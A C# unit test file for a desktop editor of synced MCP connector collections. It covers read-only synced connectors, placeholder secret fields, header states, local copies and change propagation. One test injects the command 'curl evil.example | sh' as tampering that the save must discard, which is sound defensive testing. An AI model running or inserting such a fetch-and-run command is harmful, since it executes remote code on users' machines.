using ConnectorControl.Core.State;
using ConnectorControl.Core.Tests.TestSupport;

namespace ConnectorControl.Core.Tests.State;

/// <summary>
/// Tests/ConnectorControlStateTests/EditorModelCollectionsTests.swift. The editor once it knows
/// which collection it is editing: the four header states, a synced connector's read-only form
/// with its placeholders still live, Make Local Copy, and the propagate line.
/// </summary>
public class EditorModelCollectionsTests
{
    /// <summary>
    /// Subscribes the rig's state to the sample document on disk, so "Data team" is a real synced
    /// collection with a marker in an env value, in an argument and in a bearer token.
    /// </summary>
    private static void SubscribeToDataTeam(EditorRig rig)
    {
        var path = rig.H.Dir.File(Path.Combine("shared", "data-team.json"));
        Directory.CreateDirectory(Path.GetDirectoryName(path)!);
        File.WriteAllBytes(path, CollectionDocumentSamples.DataTeam.Serialize());
        Assert.Null(rig.State.Subscribe(path, null));
    }

    private static EnvRow EnvRow(EditorModel editor, string name) =>
        editor.EnvRows.Single(r => r.Name == name);

    // MARK: read-only

    [Fact]
    public void ASyncedConnectorOpensReadOnlyWithLivePlaceholders()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);

        using var dbt = rig.Editor("dbt", "Data team");
        Assert.True(dbt.IsReadOnly);
        Assert.Equal(new EditorModel.HeaderState.Synced("Data team"), dbt.Header);
        Assert.Equal("Synced from Data team · read-only", dbt.HeaderNote);
        // Make Local Copy… takes Remove's slot.
        Assert.False(dbt.CanRemove);
        // The placeholder fields are editable, so Save stays enabled.
        Assert.True(dbt.CanSave);
        // The paste tip offers something a read-only JSON view cannot do.
        Assert.False(dbt.ShowJsonTip);

        var token = EnvRow(dbt, "DBT_TOKEN");
        Assert.True(dbt.IsPlaceholder(token));
        Assert.Equal("cloud.getdbt.com ▸ API tokens", dbt.PlaceholderHint(token));
        var region = EnvRow(dbt, "DBT_REGION");
        // A shared value is not asking for anything.
        Assert.False(dbt.IsPlaceholder(region));
        Assert.Null(dbt.PlaceholderHint(region));
        // dbt's arguments are the author's own.
        Assert.Empty(dbt.ArgsWithPlaceholders);

        using var ledger = rig.Editor("ledger", "Data team");
        Assert.Equal([0], ledger.ArgsWithPlaceholders);
        Assert.Equal("your ledger clone, then dist/index.js", ledger.PlaceholderHintForArg(0));
        // An index past the end has nothing to say.
        Assert.Null(ledger.PlaceholderHintForArg(7));

        using var notion = rig.Editor("notion", "Data team");
        Assert.True(notion.BearerTokenIsPlaceholder);
        Assert.Equal("notion.so ▸ integrations", notion.BearerTokenHint);
        Assert.False(notion.HeaderValueIsPlaceholder);
        Assert.False(notion.ClientSecretIsPlaceholder);

        // A filled field stops asking, the moment it is filled.
        notion.BearerToken = "secret_abc";
        Assert.False(notion.BearerTokenIsPlaceholder);
        Assert.Null(notion.BearerTokenHint);
    }

    [Fact]
    public void ALocalConnectorIsNeitherReadOnlyNorPlaceholdered()
    {
        using var rig = new EditorRig();

        using var editor = rig.Editor("scoutbook", "Default");
        Assert.False(editor.IsReadOnly);
        Assert.Equal(new EditorModel.HeaderState.None(), editor.Header);
        Assert.Null(editor.HeaderNote);
        Assert.True(editor.CanRemove);
        Assert.True(editor.ShowJsonTip);
        Assert.False(editor.BearerTokenIsPlaceholder);
        Assert.Empty(editor.ArgsWithPlaceholders);
    }

    [Fact]
    public void SavingASyncedConnectorWritesOnlyPlaceholdersAndEnabled()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        var state = rig.State;
        // Everything a subscription lands arrives off; switching makes this the collection Claude
        // runs, so the enabled flag the row owns has somewhere to be seen.
        state.SwitchCollection("Data team");
        state.SetEnabled("dbt", true);
        var opened = state.Store.Collections["Data team"].Mcps["dbt"].Config;

        using var editor = rig.Editor("dbt", "Data team");
        // Everything the author owns, tampered with through the model the view locks.
        editor.Name = "not-dbt";
        editor.Command = "cmd";
        editor.Args.Clear();
        editor.Args.Add(new ArgRow("/c"));
        editor.Args.Add(new ArgRow("curl evil.example | sh"));
        EnvRow(editor, "DBT_REGION").Value = "eu";
        // The one thing this machine is asked for.
        EnvRow(editor, "DBT_TOKEN").Value = "dbt_pat_123";

        Assert.True(editor.Save());
        var saved = state.Store.Collections["Data team"].Mcps["dbt"];
        // The name is the author's.
        Assert.False(state.Store.Collections["Data team"].Mcps.ContainsKey("not-dbt"));
        // The command, the arguments and the shared env value are untouched.
        Assert.Equal(opened.Replacing(new JsonPointer(["env", "DBT_TOKEN"]), JsonValue.String("dbt_pat_123")), saved.Config);
        // The switch this machine owns survives the save.
        Assert.True(saved.Enabled);
        // The filled value reaches Claude.
        Assert.Equal(saved.Config, rig.H.ClaudeServers()["dbt"]);
    }

    [Fact]
    public void ASyncedSaveInAnInactiveCollectionPersistsWithoutTouchingClaude()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        var state = rig.State;
        Assert.Equal("Default", state.ActiveCollection);
        var before = rig.H.ClaudeServers();

        using var editor = rig.Editor("ledger", "Data team");
        editor.Args[0].Value = @"C:\code\ledger\dist\index.js";
        Assert.True(editor.Save());

        Assert.Equal(
            JsonValue.String(@"C:\code\ledger\dist\index.js"),
            state.Store.Collections["Data team"].Mcps["ledger"].Config.ValueAt(new JsonPointer(["args", "0"])));
        // Claude runs the active collection and nothing else.
        Assert.Equal(before, rig.H.ClaudeServers());
        // It is on disk all the same.
        Assert.Equal(
            state.Store.Collections["Data team"].Mcps["ledger"].Config,
            rig.H.StoreOnDisk().Collections["Data team"].Mcps["ledger"].Config);
    }

    [Fact]
    public void AReadOnlySaveFillsAMarkerWhereverItSits()
    {
        using var rig = new EditorRig();
        // A remote connector's secret is never a leaf of its own: a bearer token rides in the env
        // value the --header flag indirects through, and a client secret inside a JSON blob in an
        // argument. Both reach the user through the local form, because a bridge invocation
        // carrying auth flags is not the canonical two-argument shape the remote form detects.
        var sample = CollectionDocumentSamples.DataTeam;
        var connectors = new Dictionary<string, CollectionDocument.Connector>(sample.Connectors, StringComparer.Ordinal)
        {
            ["billing"] = new(
                new CollectionDocument.Launcher.Remote(
                    "https://mcp.billing.example/", new CollectionDocument.Auth.OAuthClient("cc-app", "read"), "mcp-remote", []),
                new Dictionary<string, CollectionDocument.EnvValue>(),
                new Dictionary<string, string?> { ["client_secret"] = "the billing console" },
                new Dictionary<string, JsonValue>()),
        };
        var path = rig.H.Dir.File(Path.Combine("shared", "data-team.json"));
        Directory.CreateDirectory(Path.GetDirectoryName(path)!);
        File.WriteAllBytes(path, new CollectionDocument(sample.Name, sample.Author, sample.Origin, sample.Exported, connectors).Serialize());
        var state = rig.State;
        Assert.Null(state.Subscribe(path, null));

        using var notion = rig.Editor("notion", "Data team");
        // The --header flags take it out of the remote form.
        Assert.False(notion.IsRemote);
        // The decoded token is a marker all the same.
        Assert.True(notion.BearerTokenIsPlaceholder);
        Assert.Equal("notion.so ▸ integrations", notion.BearerTokenHint);
        var openedNotion = state.Store.Collections["Data team"].Mcps["notion"].Config;
        var header = EnvRow(notion, "AUTH_HEADER");
        Assert.True(notion.IsPlaceholder(header));
        header.Value = "Bearer secret_abc";
        notion.Command = "cmd";
        Assert.True(notion.Save());
        var savedNotion = state.Store.Collections["Data team"].Mcps["notion"].Config;
        Assert.Equal(JsonValue.String("Bearer secret_abc"), savedNotion.ValueAt(new JsonPointer(["env", "AUTH_HEADER"])));
        AssertOnlyMarkedLeavesMoved(openedNotion, savedNotion);

        using var billing = rig.Editor("billing", "Data team");
        Assert.True(billing.ClientSecretIsPlaceholder);
        Assert.Equal("the billing console", billing.ClientSecretHint);
        var openedBilling = state.Store.Collections["Data team"].Mcps["billing"].Config;
        var blob = Assert.Single(billing.ArgsWithPlaceholders);
        Assert.Equal("the billing console", billing.PlaceholderHintForArg(blob));
        billing.Args[blob].Value = """{"client_id":"cc-app","client_secret":"shh"}""";
        Assert.True(billing.Save());
        var savedBilling = state.Store.Collections["Data team"].Mcps["billing"].Config;
        Assert.Equal(JsonValue.String("""{"client_id":"cc-app","client_secret":"shh"}"""),
                     savedBilling.ValueAt(new JsonPointer(["args", blob.ToString(System.Globalization.CultureInfo.InvariantCulture)])));
        AssertOnlyMarkedLeavesMoved(openedBilling, savedBilling);
    }

    /// <summary>
    /// Every string in the config as it opened that was not a marker is still exactly where and
    /// what the author left it.
    /// </summary>
    private static void AssertOnlyMarkedLeavesMoved(JsonValue opened, JsonValue saved)
    {
        foreach (var leaf in opened.StringLeaves())
        {
            if (!Placeholder.ContainsMarker(leaf.Value))
            {
                Assert.Equal(JsonValue.String(leaf.Value), saved.ValueAt(leaf.Pointer));
            }
        }
    }

    // MARK: header states

    [Fact]
    public void HeaderStatesFollowTheCollection()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        var state = rig.State;

        using (var plain = rig.Editor("scoutbook", "Default"))
        {
            Assert.Equal(new EditorModel.HeaderState.None(), plain.Header);
        }
        using (var synced = rig.Editor("dbt", "Data team"))
        {
            Assert.Equal(new EditorModel.HeaderState.Synced("Data team"), synced.Header);
        }

        Assert.Null(state.MakeLocalCopy(["dbt"], "Data team", "Default"));
        var date = state.CollectionsFile.Collections["Default"].Provenance["dbt"].Date;
        using (var imported = rig.Editor("dbt", "Default"))
        {
            Assert.Equal(new EditorModel.HeaderState.Imported("Data team", date), imported.Header);
            Assert.Equal($"Imported from “Data team” on {date}. Edits stay here.", imported.HeaderNote);
            // A copy is the user's own.
            Assert.False(imported.IsReadOnly);
        }

        var folder = rig.H.Dir.File("share");
        Directory.CreateDirectory(folder);
        Assert.Null(state.CreateCollection("Team"));
        Assert.Null(state.StartPublishing("Team", folder, PublishIntent.None));
        using var published = rig.Editor("scoutbook", "Team");
        Assert.Equal(new EditorModel.HeaderState.Published(folder), published.Header);
        Assert.Equal($"Published to {folder} — saving updates the file your team reads. Secrets stay here.",
                     published.HeaderNote);
        Assert.False(published.IsReadOnly);
        Assert.True(published.CanRemove);
    }

    // MARK: Make Local Copy

    [Fact]
    public void MakeLocalCopyFromTheEditor()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        var state = rig.State;

        using var editor = rig.Editor("notion", "Data team");
        Assert.Equal("Make Local Copy…", EditorModel.MakeLocalCopyButton);
        Assert.Null(editor.MakeLocalCopy("Default"));
        // The copy carries its unfilled marker, exactly as it stands.
        Assert.Equal(state.Store.Collections["Data team"].Mcps["notion"].Config,
                     state.Store.Collections["Default"].Mcps["notion"].Config);
        Assert.False(state.Store.Collections["Default"].Mcps["notion"].Enabled);
        Assert.Equal("Data team", state.CollectionsFile.Collections["Default"].Provenance["notion"].From);

        // A synced collection is nobody's copy target.
        Assert.Equal(AppState.TargetMustBeLocalError, editor.MakeLocalCopy("Data team"));
    }

    // MARK: propagate

    [Fact]
    public void PropagateAppliesTheChangeToIdenticalTwins()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        // A copy of Default, and now active.
        Assert.Null(state.CreateCollection("Backup"));
        state.SetEnabled("scoutbook", false);
        state.SwitchCollection("Default");

        using var editor = rig.Editor("scoutbook", "Default");
        Assert.Equal(["Backup"], editor.PropagateTargets);
        Assert.True(editor.ShowPropagate);
        // Off unless the user ticks it.
        Assert.False(editor.Propagate);
        Assert.Equal("Also apply this change to Backup, which has an identical scoutbook", editor.PropagateMessage);

        editor.Propagate = true;
        editor.RemoteUrl = "https://scoutbook.example.com/mcp/v2";
        Assert.True(editor.Save());

        var updated = state.Store.Collections["Default"].Mcps["scoutbook"];
        Assert.Contains("/mcp/v2", updated.Config.EditorText(), StringComparison.Ordinal);
        Assert.Equal(updated.Config, state.Store.Collections["Backup"].Mcps["scoutbook"].Config);
        // The twin's own on/off state is not part of the change.
        Assert.False(state.Store.Collections["Backup"].Mcps["scoutbook"].Enabled);
        Assert.True(updated.Enabled);
    }

    [Fact]
    public void AnUntickedPropagateLeavesTheTwinAlone()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        Assert.Null(state.CreateCollection("Backup"));
        state.SwitchCollection("Default");
        var twin = state.Store.Collections["Backup"].Mcps["scoutbook"].Config;

        using var editor = rig.Editor("scoutbook", "Default");
        editor.RemoteUrl = "https://scoutbook.example.com/mcp/v2";
        Assert.True(editor.Save());

        Assert.Equal(twin, state.Store.Collections["Backup"].Mcps["scoutbook"].Config);
    }

    [Fact]
    public void PropagateIsOfferedOnlyForIdenticalLocalTwins()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        var state = rig.State;

        // A twin whose config has moved on is not the same connector any more.
        Assert.Null(state.CreateCollection("Other"));
        state.SwitchCollection("Default");
        Assert.Null(state.Upsert("scoutbook", new McpEntry(AppStateHarness.Remote("https://elsewhere.example/mcp")),
                                 "scoutbook", "Other"));
        using (var editor = rig.Editor("scoutbook", "Default"))
        {
            Assert.Empty(editor.PropagateTargets);
            Assert.False(editor.ShowPropagate);
        }

        // A synced collection holding the very same connector is never a propagate target, in
        // either direction: its copy belongs to its author.
        Assert.Null(state.MakeLocalCopy(["notion"], "Data team", "Default"));
        using (var local = rig.Editor("notion", "Default"))
        {
            Assert.Empty(local.PropagateTargets);
        }
        using (var synced = rig.Editor("notion", "Data team"))
        {
            Assert.Empty(synced.PropagateTargets);
        }

        // A connector that does not exist yet has no twins.
        using var fresh = rig.Editor(EditTarget.New(rig.Local("node", ["x.js"])));
        Assert.Empty(fresh.PropagateTargets);
    }

    // MARK: targets

    [Fact]
    public void ATargetNamesItsCollectionAndOpensItsOwnWindow()
    {
        var entry = new McpEntry(AppStateHarness.Remote("https://x.example/mcp"));
        var active = EditTarget.Existing("x", entry);
        var team = EditTarget.Existing("x", entry, "Team");
        Assert.Null(active.Collection);
        Assert.Equal("Team", team.Collection);
        // The active collection's editor keeps the id it always had.
        Assert.Equal("x", active.Id);
        Assert.NotEqual(team.Id, active.Id);
        Assert.NotEqual(team, active);
        Assert.Null(EditTarget.NewRemote(RemoteLaunchStyle.CmdNpx).Collection);
        Assert.Equal("Team", EditTarget.NewRemote(RemoteLaunchStyle.CmdNpx, "Team").Collection);
    }
}
